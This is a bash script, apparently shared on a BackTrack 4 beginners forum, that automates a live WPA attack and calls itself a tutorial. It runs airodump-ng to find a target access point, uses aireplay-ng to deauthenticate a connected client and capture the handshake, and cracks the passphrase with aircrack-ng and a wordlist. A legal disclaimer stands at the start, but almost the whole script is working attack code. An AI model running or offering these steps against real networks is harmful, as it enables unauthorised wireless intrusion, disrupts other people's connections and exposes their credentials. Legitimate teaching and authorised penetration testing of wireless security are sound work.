#!/bin/bash

# This script is a WPA capture and cracking tutorial for the BackTrack 4 Beginners Forum community.
# This tutorial walks the user through a live WPA capture and passphrase cracking from start to finish.
# Along the way I show the exact commands, specific to the user's set-up and WiFi environment, that the
# user will type in order to help them see exactly how to construct the various commands and what the 
# resulting output looks like.  This tutorial has a utility that strips the capture file to a single 
# Beacon frame and the EAPOL packets so that the WPA handshake can be easily viewed and analyzed in
# Wireshark.

# When you get tired of the obnoxious pop-up dialogs, simply comment them out, or delete them.

#%%%%%%%%%%%%% Function Declarations %%%%%%%%%%%%%


function banner {
clear
echo "*********************************" 
echo "*                               *"
echo "* yawt - Yet Another WPA Tutor  *"
echo "* (for the BT4 Beginners Forum) *"
echo "*                               *"
echo "*********************************"
}

# test-exit tests the exit codes from dialogs for 'cancel', 'no', or 'exit' and exits the script
function test-exit {

   if test $? = 1; then
    zenity --info \
	   --title "yawt - Yet Another WPA Tutor" \
	   --width 200 \
	   --text "<big><b>Geek-Out</b></big>"
    exit 
   fi
}

# select_driver returns the interface driver the user selected
function select_driver {
driver=$(zenity --list \
		--ok-label="Continue" \
		--cancel-label="Quit" \
		--height 400 --width 200 \
		--title "yawt - Yet Another WPA Tutor" \
		--text "Select your Interface Driver:

<b>If your driver isn't listed hit 'cancel</b>'" \
		--radiolist \
		--column "Select" \
		--column "Driver" \
			FALSE acx100 \
			FALSE acx111 \
			FALSE acx100usb \
			FALSE at76_usb \
			FALSE at76c503a \
			FALSE ath5k \
			FALSE ath9k \
			FALSE at76c503a \
			FALSE at76 \
			FALSE bcm43 \
			FALSE ipw2100 \
			FALSE ipw2200 \
			FALSE ipw2915 \
			FALSE ipw3945 \
			FALSE iwl3945 \
			FALSE iwlagn \
			FALSE iwlwifi \
			FALSE madwifi \
			FALSE mdk3 \
			FALSE p54 \
			FALSE r8187 \
			FALSE rt2500 \
			FALSE rt2570 \
			FALSE rt61 \
			FALSE rt73 \
			FALSE rtl8187 \
			FALSE rtl8187b \
			FALSE zd1201 \
			FALSE zd1211rw)
test-exit
}

# select_channel returns the channel number selected by the user
function select_channel { 
chan=$(zenity --list \
	      --height 400 \
	      --width 100 \
	      --title "yawt - Yet Another WPA Tutor" \
	      --text "Target AP on Channel?" \
	      --radiolist \
	      --column "Select" \
	      --column "Channel" \
		FALSE "1" \
		FALSE "2" \
		FALSE "3" \
		FALSE "4" \
		FALSE "5" \
		FALSE "6" \
		FALSE "7" \
		FALSE "8" \
		FALSE "9" \
		FALSE "10" \
		FALSE "11" \
		FALSE "12" \
		FALSE "13" \
		FALSE "14")
test-exit
}

# get_bssid returns the bssid typed or pasted by the user
function get_bssid {
bssid=$(zenity --entry \
	       --title "yawt - Yet Another WPA Tutor" \
	       --text "Target AP BSSID (MAC)?")

test-exit
}

# get_essid returns the essid typed or pasted by the user
function get_essid {
essid=$(zenity --entry \
	       --title "yawt - Yet Another WPA Tutor" \
	       --text "Target AP ESSID (name)?

If ESSID contains spaces,
encapsulate with ' ' ")

test-exit
}

# get_client returns the client MAC typed or pasted by the user
function get_client {
client=$(zenity --entry \
		--title "yawt - Yet Another WPA Tutor" \
		--text "What is MAC of the client (STATION) you want to deauthenticate?")

test-exit
}

# get_capture returns the capture filename typed by the user
function get_capture {
capture=$(zenity --entry \
		 --title "yawt - Yet Another WPA Tutor" \
		 --text "What do you want to name your capture file (no extenstion)?")

test-exit
}

# success is a large rambling function that really should be split up into several functions (I'll split it up in the next version)
function success {
zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Great! - Let's grab your capture file and process it (i.e. strip out everything except 1 Beacon frame and the EAPOL packets).  Not only will this processing make it easier to examine for the handshake components, it makes it small enough to email easily.

<big><b>Note: You want to select the file named $capture-01.cap</b></big>"

cap_path=$(zenity --file-selection \
		  --file-filter "$capture-01.cap" \
		  --title "yawt - Yet Another WPA Tutor")

test-exit


#%%%%%%%%%%%%%%%%%%%%% Strip the capture file %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

tshark &>/dev/null -r $cap_path -R "eapol" -w stripped1.cap

tshark &>/dev/null -r $cap_path -R "wlan_mgt.tag.interpretation eq $essid" -c 1 -w stripped2.cap

NOW=$(date +"%b%d%y") # We'll append the date to each reslutant stripped file so that capture files don't get overwritten day-to-day.

mergecap stripped1.cap stripped2.cap -w $capture-$NOW.cap

rm stripped1.cap

rm stripped2.cap

#%%%%%%%%%%%%%%% Let's make sure we've got a good capture by examining the stripped capture in Wireshark %%%%%%%%%%%%%%%%%%%%%%%%%%%

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Now - Let's make sure we've got a valid capture file.  We're going to open our processed capture in Wireshark and look to see if we have one Beacon Frame and at least 3 EAPOL packets.

<b>You want to select the file named: $capture-$NOW.cap</b>

Exit Wireshark when you're done examining the stripped capture file." 

processed_path=$(zenity --file-selection \
			--file-filter "$capture-$NOW.cap" \
			--title "yawt - Yet Another WPA Tutor" )

test-exit

wireshark $processed_path

#%%%%%%%%%%%%%%%%%%%%%%% Did we get a good WPA handshake capture? %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

zenity  --question \
	--ok-label="Yes" \
	--cancel-label="No" \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Did you get a Beacon frame and at least 3 EAPOL packets?"

if test $? = 1; then
zenity --info \
	   --title "yawt - Yet Another WPA Tutor" \
	   --text "Well, that sucks.  Start over and try again.  You may want to try getting closer to the target, or getting that big-ass antenna."
    zenity --info \
	   --title "yawt - Yet Another WPA Tutor" \
	   --width 200
	   --text "<b>Geek-Out</b>"
exit

else
  zenity --question \
	 --ok-label="Yes" \
	 --cancel-label="No" \
	 --title "yawt - Yet Another WPA Tutor" \
	 --text "Excellent!  Do you want to try cracking the WPA key now?"
     if test $? = 0; then

#%%%%%%%%%%%%%%%%%%% Let's crack the password %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

       zenity   --info \
		--title "yawt - Yet Another WPA Tutor" \
		--text "Okay, which password list file do you want to use?"

       pswrdlst_path=$(zenity --file-selection \
			      --title "yawt - Yet Another WPA Tutor" )

       test-exit

echo "COMMAND:  aircrack-ng -w $pswrdlst_path -b $bssid $processed_path" | zenity --text-info --width 900 --title "yawt - Yet Another WPA Tutor"

       aircrack-ng -w $pswrdlst_path -b $bssid $processed_path

#%%%%%%%%%%%%%%%%%%% Bye %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
   fi

fi

}

#%%%%%%%%%%%%% Start of Script %%%%%%%%%%%%%

banner

zenity --question \
	--ok-label="Continue" \
	--cancel-label="QUIT" \
	--title "yawt - Yet Another WPA Tutor" \
	--text "
The purpose of this tutorial is to help teach and guide you on capturing and cracking WPA using the tools in Back Track 4.  You should only use these techniques against Access Points (APs) you own or are under contract to conduct penetration testing against.  <b>It is illegal to crack the WPA keys of your neighbor's AP or any other AP that you don't control.</b>  With knowledge comes responsibility.  This tutorial is for educational purposes only.  

We will step you through a live WPA capture session, providing guidance and hints along the way.  We'll show you the <b>exact</b> commands you need to run on your system exactly as you should type them when you do them yourself.  

We will strip your capture file down to the bare elements; a single Beacon frame and at least three EAPOL packets.  Lastly, we'll show you the stripped down capture file in Wireshark before moving on to cracking the WPA passphrase.  

<b><i>!!! This tut requires you to be logged in as root !!!</i></b>

This tut requires tshark, the command line version of Wireshark.  You can get tshark by opening up a connection to the internet, firing up a console and typing:

 <b> apt-get install tshark</b>.  

If you need to install tshark and/or reboot into root, hit 'Quit.  Otherwise, hit 'Contine' and let's get started. "

test-exit

# %%%%%%%%%%%%% Let's check to see if tshark is installed %%%%%%%%%%%%%%%%%%%%%%%%%

type -P tshark &>/dev/null || { zenity --info --title "yawt - Yet Another WPA Tutor" --text "Bummer!... This utility requires tshark but it's not installed.  Download and install tshark, then try again."  >&2; exit 1; }

# %%%%%%%%%%%%% Let's check to see if Wireshark is installed %%%%%%%%%%%%%%%%%%%%%

type -P wireshark &>/dev/null || { zenity --info --title "yawt - Yet Another WPA Tutor" --text "Bummer!... This utility requires wireshark but it's not installed.  Download and install wireshark, then try again." >&2; exit 1; }

#%%%%%%%%%%%%% Let's set-up our interface %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

zenity --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "First, let's identify our interface name and it's associated driver.  

In this step, we're going to run the command airmon-ng with no arguments.  We're going to be looking for the interface name listed under the 'Interface' column and the driver name listed under the 'Driver' column of the resulting output.  

Okay, let's get started by issuing the airmon-ng command and gather some important information that will help us set-up our interface for the attack.  Throughout this tut, we will show you the exact commands we are issuing.  We will pop them up in a text dialog like the one you are about to see...."

echo "COMMAND:  airmon-ng" | zenity --text-info --width 500 --title "yawt - Yet Another WPA Tutor" 

airmon-ng

#@@@@@@@@@@@@@@@@@@ Select Driver @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

select_driver

if [ -z $driver ]; then

zenity = --warning \
	 --title "yawt - Yet Another WPA Tutorial" \
	 --text "You didn't select a driver"

select_driver

fi

if test $? = 1; then

driver=$(zenity --entry \
		--title "yawt - Yet Another WPA Tutor" \
		--text "Enter driver name (i.e. iwlagn, rtl8187, rt73, etc.)?")

test-exit

  if [ -z $driver ]; then 

	zenity = --warning \
	 	--title "yawt - Yet Another WPA Tutorial" \
	 	--text "You didn't enter a driver name"
	exit

  fi

fi

banner

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Okay, next we're going to refresh our interface before we begin the attack so that we know it's in a know good state."

echo "COMMAND:  rmmod $driver" | zenity --text-info --width 500 --title "yawt - Yet Another WPA Tutor"

echo "COMMAND:  modprobe $driver" | zenity --text-info --width 500 --title "yawt - Yet Another WPA Tutor"

rmmod $driver 

modprobe $driver 

airmon-ng

interface=$(zenity --list \
		   --height 200 \
		   --width 100 \
		   --title "yawt - Yet Another WPA Tutor" \
		   --text "Select the Interface
you want to use:" \
		   --radiolist \
		   --column "Select" \
		   --column "Interface" \
		   	TRUE "wlan0" \
			FALSE "wlan1" \
			FALSE "wlan2")

test-exit

banner

zenity --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Alright, now we need to place our interface into monitor mode and make note of which monitor interface our card is place on (i.e., mon0, ath0, etc.)."

echo "COMMAND:  aimon-ng start $interface" | zenity --text-info --width 500 --title "yawt - Yet Another WPA Tutor"

airmon-ng start $interface

mon_iface=$(zenity --list \
		  --height 200 --width 400 --title "yawt - Yet Another WPA Tutor" \
		  --text "Monitor Mode Interface (<b>hit 'cancel' if not listed</b>):"\
		  --radiolist \
		  --column "Select" \
		  --column "Monitor Mode interface" \
			TRUE "mon0" \
			FALSE "ath0" \
			FALSE "wifi0")

 if test $? = 1; then

    mon_iface=$(zenity --entry \
		    --title "yawt - Yet Another WPA Tutor" \
		    --text "Enter Monitor Mode Interface (i.e. mon1, ath3, etc.)")

    test-exit

   if [ -z $mon_iface ]; then
	
	zenity = --warning \
	 	--title "yawt - Yet Another WPA Tutorial" \
	 	--text "You didn't enter a monitor name"
	exit
  fi
	
 fi

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Don't worry about any error message stating that,
 
<b><i>'Found # processes that could cause trouble.'</i></b>

We'll take of those with:  airmon-ng check kill".

echo "COMMAND:  aimon-ng check kill" | zenity --text-info --width 500 --title "yawt - Yet Another WPA Tutor"

airmon-ng check kill &>/dev/null

#%%%%%%%%%%%%%% Let's start our attack :-D %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

clear

banner

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Okay, we're ready to start scanning for the target. 

We're going to run airmon-ng with no arguments to recon the local environment.  We'll fill in the information we need for the attack from this step.  

<b>When you see your target in the list, press ctrl-c</b>

We'll prompt you to provide the information needed to proceed."

echo "COMMAND:  airodump-ng $mon_iface" | zenity --text-info --width 500 --title "yawt - Yet Another WPA Tutor"

#%%%%%%%%%%%%%% Let's collect the information we need for the attack %%%%%%%%%%%%%%%%

airmon-ng start $interface &>/dev/null

airodump-ng $mon_iface 

#%%%%%%%%%%%%%%%%%%%%%%%% Select Target Channel %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

select_channel

if [ -z $chan ]; then

zenity = --warning \
	 --title "yawt - Yet Another WPA Tutorial" \
	 --text "You didn't select a channel"

select_channel

fi

#%%%%%%%%%%%%%%%%%% Get BSSID %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

get_bssid

if [ -z $bssid ]; then

zenity = --warning \
	 --title "yawt - Yet Another WPA Tutorial" \
	 --text "You didn't enter a BSSID"

get_bssid

fi

#%%%%%%%%%%%%%%%%%%%% Get ESSID %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

get_essid

if [ -z $essid ]; then

zenity = --warning \
	 --title "yawt - Yet Another WPA Tutorial" \
	 --text "You didn't enter a ESSID"

get_essid

fi


#%%%%%%%%%%%%%%% We're ready to capture the WPA handshake now %%%%%%%%%%%%%%%%%%%%

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Okay.. We've gathered the information needed to isolate and monitor our target.  

Next we need to identify an associated client (a legitimate user logged onto our target), record the client MAC address and perform a deauthentication attack against that client, forcing them to re-associate thereby allowing us to capture the handshake.

We're going to start monitoring the target only.  It's crucial that we identify an associated client and make note of it's MAC address.  

<b>Once you see the associated client listed at the bottom of the display under the 'Station' column, hit ctrl-c and then we'll record it.</b>

Be a little patient, sometimes it takes a few seconds for the associated client (STATION) to pop-up in the output."



echo "COMMAND: airodump-ng -c $chan --bbsid $bssid $mon_iface" | zenity --text-info --width 500 --title "yawt - Yet Another WPA Tutor" 

airodump-ng -c $chan --bssid $bssid $mon_iface 

zenity  --question \
	--ok-label="Yes" \
	--cancel-label="No" \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Is there an appropriate client associated with the target AP?"

if test $? = 1; then
zenity --info \
	   --title "yawt - Yet Another WPA Tutor" \
	   --text "Too bad!  You should try again later when there is a client associated with the target AP."
    zenity --info \
	   --title "yawt - Yet Another WPA Tutor" \
	   --width 200 \
	   --text "<b>Geek-Out</b>"
exit

else

#%%%%%%%%%%%%%%%%%%%%%%% Get Client %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

get_client

if [ -z $client ]; then

zenity = --warning \
	 	--title "yawt - Yet Another WPA Tutorial" \
	 	--text "You didn't enter a client MAC"

get_client

  fi
fi

#%%%%%%%%%%%%%%%%%%%%% Get Capture Name %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Okay, before we deauthenticate our victim, we need to start a capture file using airodump-ng so we can record the WPA handshake.  We need to take care to start the capture on the same channel as the target AP and restrict the capture to the AP by providing the AP's BSSID (MAC)."

get_capture

if [ -z $capture ]; then

zenity = --warning \
	 	--title "yawt - Yet Another WPA Tutorial" \
	 	--text "You didn't enter a capture file name"

get_capture

fi

echo "COMMAND: airodump-ng -c $chan --bssid $bssid -w $capture $mon_iface" | zenity --text-info --width 600 --title "yawt - Yet Another WPA Tutor"

#%%%%%%%%%%%%%%%%%%%%% Deauthenticate Client %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--text "Alright, we're going to open another console and perform a deauthentication against $client.  

Be looking at the upper right-hand portion of the capture file output window.  Once you see:

<b>'WPA handshake: $bssid'</b> 

Do a little victory dance and hit ctrl-c.

Be a little patient, sometimes it takes the:
WPA handshake: $bssid 
message to pop-up."


echo "COMMAND: aireplay-ng -0 20 -a $bssid -c $client $mon_iface" | zenity --text-info --width 600 --title "yawt - Yet Another WPA Tutor" 

xterm -e "sleep 2; aireplay-ng -0 20 -a $bssid -c $client $mon_iface" & 

airodump-ng -c $chan --bssid $bssid -w $capture $mon_iface

#%%%%%%%%%%%%%%% Did you get the Handshake ? %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

zenity  --question \
	--ok-label="Yes" \
	--cancel-label="No" \
	--title "yawt - Yet Another WPA Tutor" \
	--width 500 \
	--text "Did you get the WPA handshake:
 <b>WPA handshake: $bssid</b>?"

	if test $? = 0; then

		success

	else
  		zenity --question \
		 --ok-label="Yes" \
	 	 --cancel-label="No" \
		 --title "yawt - Yet Another WPA Tutor" \
	 	 --text "Crap!  Do you want to deauthenticate the client again?

Keep in mind that repeatedly deauthenticating a client is <b>not</b> a subtle thing to do and the client may notice something is 'happening' to his connection."

     		if test $? = 0; then 
			xterm -e "sleep 2; aireplay-ng -0 20 -a $bssid -c $client $mon_iface" & 
			airodump-ng -c $chan --bssid $bssid -w $capture $mon_iface

		zenity  --question \
	--ok-label="Yes" \
	--cancel-label="No" \
	--title "yawt - Yet Another WPA Tutor" \
	--width 500 \
	--text "Did you get the WPA handshake:
<b>WPA handshake: $bssid</b>?"

	if test $? = 1; then
  		zenity --question \
		 --ok-label="OK" \
	 	 --cancel-label="No" \
		 --title "yawt - Yet Another WPA Tutor" \
	 	 --text "Bummer!  You really shouldn't deauthenticate a 3rd time.  Move closer to the client you are trying to deauthenticate, wait a reasonalbe period of time and try again."

		zenity --info \
	   		--title "yawt - Yet Another WPA Tutor" \
	   		--width 200 \
			--text "<b>Geek-Out</b>"
			exit

     		else 

			success
           fi

	fi

fi

zenity  --info \
	--title "yawt - Yet Another WPA Tutor" \
	--width 300 \
	--text "<b>Geek-Out</b>"
exit